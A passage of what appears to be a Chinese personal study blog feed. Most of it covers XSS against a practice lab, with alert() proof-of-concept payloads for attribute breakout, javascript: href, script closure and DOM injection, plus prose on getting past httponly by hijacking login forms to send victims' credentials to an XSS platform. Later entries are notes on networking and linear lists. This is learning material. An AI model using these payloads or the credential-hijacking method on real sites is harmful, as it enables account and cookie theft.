/></center><p>&emsp;&emsp;首先输入五种符号，查看转义情况，可以发现，五种符号中，单引号是没有被转义的，所以我们可以通过#’的办法将herf给闭合掉从而运行我们想要的语句了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#&#x27; onclick=&#x27;alert(1)&#x27;<br></code></pre></td></tr></table></figure> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/11.png" style="zoom:80%;" /></center><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#&#x27; onclick=&#x27;alert(&quot;xss&quot;)&#x27;<br></code></pre></td></tr></table></figure> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/12.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-XSS之href输出"><a href="#4-XSS之href输出" class="headerlink" title="4.XSS之href输出"></a>4.XSS之href输出</h4><p>&emsp;&emsp;一般而言，href主要是实现对超链接进行转跳的功能，并且会有伴随着htmlspecialcharsd的协助，输出在a标签的href属性里面，可以使用JavaScript协议来执行语句</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>)</span><br></code></pre></td></tr></table></figure> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;一般而言，在a标签的href属性汇总，一般放的是URL连接，所以会有规定输入必须以http或者https开头即可</p><p>&emsp;</p><h4 id="5-XSS之JavaScript输出"><a href="#5-XSS之JavaScript输出" class="headerlink" title="5.XSS之JavaScript输出"></a>5.XSS之JavaScript输出</h4><p>&emsp;&emsp;JavaScript里面是不会对tag和字符实体进行解释，所以需要进行js的转义，如果检验到JavaScript的代码，可以思考是否有攻击插入点</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;明显用到了JavaScript上的界面变化，可以尝试构造闭合，然后插入我们需要的js语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/17.png" style="zoom:80%;" /></center>&emsp;<h4 id="6-XSS之httponly绕过"><a href="#6-XSS之httponly绕过" class="headerlink" title="6.XSS之httponly绕过"></a>6.XSS之httponly绕过</h4><p>&emsp;&emsp;如果在cookie中设置了httponly属性，那么通过JavaScript将无法读取到cooker信息，这样子在一定程度上能过有效的防止XSS攻击。</p><p>&emsp;&emsp;首先要明白，它的作用是防止cookie被读取，并不是防止跨站脚本执行，接下来模拟场景，首先使用php语言数字httponly，查看执行情况</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/18.png" style="zoom:80%;" /></center><p>&emsp;&emsp;1或者ture的代表这个函数启用了，然后我们使用xss工具注入了JavaScript语句读取cookie值</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/20.png" style="zoom:80%;" /></center> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/21.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，在网络模块汇中，确实访问了xss工具网址</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/22.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在最终的反馈汇总，cookie是空白，这说明httponly是阻止了cookie的读取，但是JavaScript是执行了的。那么这种情况下，我们应该怎么办呢，首先明确我们需要的是获取后台的权限，在后台的权限中，有两种加入方式，一种是cookie，另一种则是账号密码的输入</p><p>&emsp;&emsp;账号密码的获取又分两种情况，一种是浏览器保存读取，一种是浏览器没有保存读取的</p><ul><li><p>账号密码不自动读取</p><p>&emsp;&emsp;一般来说，这种需要我们将注入了劫持语句的网页链接发给受害者，采取表单劫持的办法，他的作用就是在输入账号密码的地方，类似于抓包后，将账号密码再发送一份给跨站平台，这样子，我拿就可以获取到受害者的账号密码了</p><p>&emsp;&emsp;这种情况的要求比较高，前提条件上的需要在账号密码的登录界面中</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/23.png" style="zoom:80%;" /></center> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/24.png" style="zoom:80%;" /></center></li><li><p>账号密码自动读取</p><p>&emsp;&emsp;这种情况下，由于输入账号，浏览器会自动补充密码，我们可以通过XSS平台获取明文内容，这是产生在后台的XSS，存储型XSS如留言等</p> <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/25.png" style="zoom:80%;" /></center></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站——攻击类型</title>
    <link href="/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站——攻击类型"><a href="#XSS跨站——攻击类型" class="headerlink" title="XSS跨站——攻击类型"></a>XSS跨站——攻击类型</h1><h4 id="1-反射型XSS（get）"><a href="#1-反射型XSS（get）" class="headerlink" title="1.反射型XSS（get）"></a>1.反射型XSS（get）</h4><p>&emsp;&emsp;首先在界面中是能够有输入框的，所以尝试使用测试代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>onclick是一个鼠标触发事件，也就是鼠标触发之后就会发出警报<br><span class="hljs-comment">#&#x27; onclick=&quot;alert(2)&quot;&gt;  </span><br><br><span class="hljs-regexp">//</span>直接用script显示警告也可行<br>&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，在输入框中有长度限制，我们无法完成完整代码的输入，所以尝试在url中进行填充</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;还有一种方法是改变网页html代码中的长度限制。从而使得输入能够完整</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/3.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/4.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/5.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="2-反射型XSS（post）"><a href="#2-反射型XSS（post）" class="headerlink" title="2.反射型XSS（post）"></a>2.反射型XSS（post）</h4><p>&emsp;&emsp;post与get型的区别在于post型的漏洞一般是通过表单的方式进行提交，我们无法利用到URL进行攻击</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/22.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/23.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/24.png" style="zoom:80%;" /></center><p>&emsp;&emsp;很明显，在登录进去后，能够进行JavaScript恶意代码的注入，，但是在上方的URL并没有改变，也就是我吗无法使用像get类型一样的方法直接发送带有恶意代码的URL进行相关的攻击，这就涉及到一些有关cookie的配合攻击，后续的攻击类型会涉及到，这里只需要明白和get类型的区别即可</p><p>&emsp;</p><h4 id="3-存储型XSS"><a href="#3-存储型XSS" class="headerlink" title="3.存储型XSS"></a>3.存储型XSS</h4><p>&emsp;&emsp;存储型 XSS 漏洞，是将恶意脚本注入到 Web 应用程序中的存储区域（例如数据库、文件系统等），当其他用户访问包含恶意脚本的页面时，恶意脚本会被执行，从而导致安全问题。</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/7.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到，当我提交我们的留言时，留言会放到下面的存储区域，如果在输入的区域中加入JavaScript代码，那么就能实现将恶意脚本注入到 Web 应用程序中，从而导致别人打开该页面时，会执行代码</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/11.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/9.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-DOM型XSS"><a href="#4-DOM型XSS" class="headerlink" title="4.DOM型XSS"></a>4.DOM型XSS</h4><p>&emsp;&emsp;首先了解HTML中的DOM树，其本质就是代码在操作代码的属性。以某网站为例子：</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/12.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;当点击更多时，网站的地址并没有变化，但明显页面的布局发生了变化，所以我们使用f12查看网络流量情况</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/14.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;这表示是有流量的改变，加载的变化其实是操作HTML代码中进行实现，达到最终的增加目的，这种情况就涉及到DOM型的构造，接下来以pikaqiu的漏洞复现为例</p><p>&emsp;&emsp;首先是在目标站点上寻找输入点，并输入判断代码查看回应</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到在输入特定判断代码后，回显出现了改变，也就说明该输入点并没有对特殊字符进行过滤，接下来查看网页相关代码</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/17.png" style="zoom:80%;" /></center><p>&emsp;&emsp;JavaScript的代码在执行后会将a标签和输入的字符串连接，就如同一开始是空白的页面，在输入后输出了what do you see的回显，通过这个JavaScript函数，利用了DOM将字符串进行了拼接并把值给了a标签的href，然后输出，开始构造执行代码</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">#<span class="hljs-string">&#x27; onclick=&quot;alert(&#x27;</span>xss<span class="hljs-string">&#x27;)&quot;&gt;</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/18.png" style="zoom:80%;" /></center><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/19.png" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看到当我们加入代码后，只要点击what do you see后就能够出现alert的警告内容，可恶，一开始我忘记给括号内的xss加入单引号了，导致一直没成功，大家在输入的时候一定要注意语法问题</p><p>&emsp;</p><h4 id="5-DOM型XSS-X"><a href="#5-DOM型XSS-X" class="headerlink" title="5.DOM型XSS-X"></a>5.DOM型XSS-X</h4><p>&emsp;&emsp;该类型的主要区别在于URL出现了输入的内容</p><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/20.png" style="zoom:80%;" /></center><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">text=%23%27+onclick%3D<span class="hljs-string">&quot;alert%28%27xss%27%29&quot;</span>&gt;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%B8%80%EF%BC%89/21.png" style="zoom:80%;" /></center><p>&emsp;&emsp;DOM-X型具有更大的危害，它能够通过URL输入一些内容，而普通型的DOM攻击仅仅是针对前端，但是URL作为参数前后端传递。</p><p>&emsp;</p><h4 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6.注意事项"></a>6.注意事项</h4><p>&emsp;&emsp;在进行脚本写入的测试中，如果使用了alert等语句，数字可以不用处理直接写在括号内，但是输入字母和汉字就需要单引号或者双引号，这是语法规则，当然，使用/   /进行闭合也是可以的，但是在输出的内容上也会带有//。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站——基础知识</title>
    <link href="/2022/10/01/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/10/01/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS跨站——基础知识"><a href="#XSS跨站——基础知识" class="headerlink" title="XSS跨站——基础知识"></a>XSS跨站——基础知识</h1><h4 id="0-学习思维导图"><a href="#0-学习思维导图" class="headerlink" title="0.学习思维导图"></a>0.学习思维导图</h4><center><img src="/img/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/0.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="1-XSS跨站的简介"><a href="#1-XSS跨站的简介" class="headerlink" title="1.XSS跨站的简介"></a>1.XSS跨站的简介</h4><p>&emsp;&emsp; 跨网站脚本（XSS）又称跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。</p><p>&emsp;&emsp;XSS的产生层面是在客户端，主要是出现在一些输出类函数，漏洞的危害主要收到JavaScript的影响，同样，浏览器的内核版本也十分重要，如果浏览器内核版本有时候决定了JavaScript脚本能不能执行，浏览器内核版本高的话，也会有对应的应对方式，这都是构成XSS攻击的因素</p><p>&emsp;</p><h4 id="2-XSS跨站的原理"><a href="#2-XSS跨站的原理" class="headerlink" title="2.XSS跨站的原理"></a>2.XSS跨站的原理</h4><p>&emsp;&emsp;XSS攻击的原理是攻击者在目标网站的页面中注入恶意脚本，使得当其他用户访问该页面时，该恶意脚本会被执行。攻击者可以利用注入的恶意脚本窃取用户的敏感信息，例如用户名、密码、cookie等，并将这些信息发送到攻击者的服务器上。</p><p>&emsp;&emsp;攻击者可以通过以下方式实现XSS攻击：</p><ul><li><p>反射型XSS攻击：</p><p>攻击者通过发送包含恶意脚本的链接或者表单数据，来触发目标网站在响应中输出恶意脚本，从而实现攻击。</p><p>发包 massage=liaoyue  =&gt;php后端 =&gt; 回包</p></li><li><p>存储型XSS攻击：</p><p>攻击者将恶意脚本存储在目标网站的数据库中，当其他用户访问包含该恶意脚本的页面时，恶意脚本会被执行。</p><p>发包 massage=liaoyue  =&gt;php后端 =&gt; 写到数据库的表汇总 =&gt;访问触发</p></li><li><p>DOM型XSS攻击：</p><p>攻击者通过修改目标网站的DOM结构来注入恶意脚本，从而实现攻击。</p><p>发包 massage=liaoyue  =&gt;本地浏览器静态前端代码 =&gt; php后端</p></li></ul><p>&emsp;&emsp;XSS攻击的成功取决于目标网站对用户输入数据的处理方式。如果目标网站没有对用户输入数据进行适当的验证和过滤，那么攻击者就可以利用这个漏洞来注入恶意脚本，并将其传播给其他用户。</p><center><img src="/img/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-XSS测试平台"><a href="#3-XSS测试平台" class="headerlink" title="3.XSS测试平台"></a>3.XSS测试平台</h4><p>&emsp;&emsp;<a href="https://xssaq.com/">https://xssaq.com/</a></p><center><img src="/img/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2.png" style="zoom:80%;" /></center><center><img src="/img/xss%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在这个平台中，只要我们输入对应的环境，他会给出可能能够注入XSS的代码，也能看见XSS的注入效果，是一个十分不错的平台</p><p>&emsp;</p><h4 id="4-XSS查找和判断"><a href="#4-XSS查找和判断" class="headerlink" title="4.XSS查找和判断"></a>4.XSS查找和判断</h4><p>&emsp;&emsp;判断一个网站是否存在 XSS 漏洞需要进行一系列测试和分析，以下是一些可能有用的方法：</p><ul><li><p>输入特殊字符和代码：</p><p>在网站的输入框（如搜索框、评论框、留言板等）中输入一些特殊字符和代码（如尖括号、单引号、双引号、script 标签等），观察是否能成功执行代码并影响页面的行为。如果成功执行了代码，那么这个网站可能存在 XSS 漏洞。</p></li><li><p>使用 XSS 扫描工具：</p><p>现在市面上有许多 XSS 扫描工具，可以自动化地检测一个网站是否存在 XSS 漏洞。常见的 XSS 扫描工具包括 Acunetix、Netsparker、Burp Suite 等。</p></li><li><p>查看页面源代码：</p><p>在浏览器中查看网站的页面源代码，搜索关键字（如 “script”、“iframe”、“onload” 等），观察是否存在被注入的脚本。</p></li><li><p>查看请求和响应数据：</p><p>使用浏览器开发者工具查看网站的请求和响应数据，观察是否存在未经过滤的数据被返回给客户端的情况。如果存在未经过滤的数据，那么攻击者就可以注入恶意代码并利用 XSS 漏洞进行攻击。</p></li></ul><p>&emsp;&emsp;需要注意的是，以上方法都有一定的局限性，不能保证完全检测出所有的 XSS 漏洞。因此，建议在开发和部署网站时，尽可能遵循安全最佳实践，如对用户输入数据进行严格的过滤和验证、使用安全的编程语言和框架等，以减少 XSS 漏洞的风险。</p><p>&emsp;</p><h4 id="5-XSS漏洞危害"><a href="#5-XSS漏洞危害" class="headerlink" title="5.XSS漏洞危害"></a>5.XSS漏洞危害</h4><ul><li><p>窃取用户信息</p><p>攻击者可以通过注入恶意脚本，窃取用户的敏感信息，如用户名、密码、cookie 等</p></li><li><p>恶意操作</p><p>攻击者可以通过注入恶意脚本，对受害者的账户进行恶意操作，如转账、发帖、删除信息等</p></li><li><p>篡改网页内容</p><p>攻击者可以通过注入恶意脚本，篡改受害者浏览的网页内容，包括添加广告、修改页面布局等</p></li><li><p>劫持会话</p><p>攻击者可以通过注入恶意脚本，劫持受害者的会话，让受害者执行一些恶意操作，如发起攻击等</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>前言</title>
    <link href="/2022/09/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/"/>
    <url>/2022/09/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;计网是十分重要的一门知识课程，尽管大二已经修完了相关课程，但还是忘记了一些内容，所以需要重新学习，在温故的过程中进行新知识的挖掘。</p><p>&emsp;&emsp;具备扎实的计算机网络基础知识，对于常用的网络设备（交换机、路由器）、软件（思科、华为模拟器），这里本人是使用过华为模拟器过的，配置过交换机和路由器的，但是可惜的是，俺已经忘的一干二净了，所以需要重新捡起来。对于这些不同的网络设备使用以及配置都至关重要。需要熟练掌握计算机网络体系结构中常用协议（ARP协议、ICMP协议、 ftp协议、SSH协议等）的实现原理。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>线性表</title>
    <link href="/2022/09/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/"/>
    <url>/2022/09/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h4 id="1-知识框架"><a href="#1-知识框架" class="headerlink" title="1.知识框架"></a>1.知识框架</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-线性表的基本术语"><a href="#2-线性表的基本术语" class="headerlink" title="2.线性表的基本术语"></a>2.线性表的基本术语</h4><p>&emsp;&emsp;线性表是具有相同数据类型的<em><strong>n（n≥0）</strong></em>个数据元素的有限序列：</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;在线性表中ai是线性表中第i个元素的位序（位序冲1开始，数组下标从0开始），并且除第一个元素外，每个元素有且仅有一个<strong>直接前驱</strong>；除最后一个元素外，每个元素有且仅有一个<strong>直接后继</strong></p><p>&emsp;</p><h4 id="3-线性表的基本操作"><a href="#3-线性表的基本操作" class="headerlink" title="3.线性表的基本操作"></a>3.线性表的基本操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">InitList(&amp;L)    <span class="hljs-comment">//初始化表，构建一个空的线性表</span><br>Length(L)  <span class="hljs-comment">//求表长，返回表的长度，即表L中数据元素的个数</span><br>    <br>LocateElem(L,e) <span class="hljs-comment">//按值查找操作，在表中查找具有给定关键字值的元素</span><br>GetElem(L,i) <span class="hljs-comment">//按位查找，获取表中第i个位置的元素的值</span><br>    <br>ListInsert(&amp;L,i,e)  <span class="hljs-comment">//插入操作，在表L中第i个位置上插入指定元素e</span><br>ListDelete(&amp;L,i,&amp;e)   <span class="hljs-comment">//删除操作，删除表L第i个位置的元素，并用e返回删除元素的值</span><br>    <br>PrintList(L) <span class="hljs-comment">//输出操作，按前后顺序输出线性表L的所有元素值</span><br>Empty(L)     <span class="hljs-comment">//判空操作，若L为空表则返回ture，反之则返回false</span><br>DestroyList(&amp;L)  <span class="hljs-comment">//销毁操作，销毁线性表并释放相关的内存</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="4-顺序表的定义"><a href="#4-顺序表的定义" class="headerlink" title="4.顺序表的定义"></a>4.顺序表的定义</h4><p>&emsp;&emsp;顺序表是指线性表的顺序存储方式，它用一组地址连续的存储单元依次存储线性表中的数据元素，从而使得逻辑上相邻的两个元素在物理位置上也是相邻的。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;每一个数据元素的存储位置都和线性表的起始位置相差一个和该数据元素的位序成正比的常数，因此，线性表的任一数据元素都可以随机存取，所以线性表的顺序存储结构是一种随机存取的存储结构。</p><p>&emsp;</p><h4 id="5-数组分配类别"><a href="#5-数组分配类别" class="headerlink" title="5.数组分配类别"></a>5.数组分配类别</h4><p>&emsp;&emsp;一维数组可以是静态分配，也可以是动态分配的，在静态分配时，由于数组的大小和空间已经提前固定，一旦空间占满，再加入新的数据就会产生溢出，进而导致程序崩溃，而在动态分配时，储存数组的空间是在程序执行过程中通过动态存储分配语句分配的，一旦数据空间占满，就会另外开辟一块更大的存储空间，用以替换原来的存储空间，从而达到扩充存储数组的目的</p><ul><li>静态分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 10  <span class="hljs-comment">//定义最大长度</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span 